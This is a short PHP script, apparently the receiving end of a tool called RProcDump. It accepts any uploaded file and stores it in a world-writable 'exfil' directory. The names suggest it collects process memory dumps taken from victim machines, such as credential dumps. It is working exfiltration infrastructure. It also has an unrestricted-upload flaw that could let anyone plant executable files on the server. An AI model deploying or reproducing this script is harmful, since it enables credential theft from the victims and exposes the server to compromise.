<?php
# RProcDump basic file uploader 
	if(isset($_GET['pc'])) { $pc=addslashes(html_entity_decode($_GET['pc'])); }
	if (!file_exists("exfil")) {
		mkdir("exfil", 0777, true);
		}	
	if (isset($_FILES['file']['name'])){
	$size=$_FILES['file']['size'];
	$extension_upload = strtolower( substr( strrchr($_FILES['file']['name'], '.')  ,1)  );
	#$extension_upload = "zip"
	$nom = basename($_FILES['file']['name']);
	$nom2 = "exfil/{$nom}.{$extension_upload}";
	move_uploaded_file($_FILES['file']['tmp_name'],$nom2);
	}
?>
Uploaded !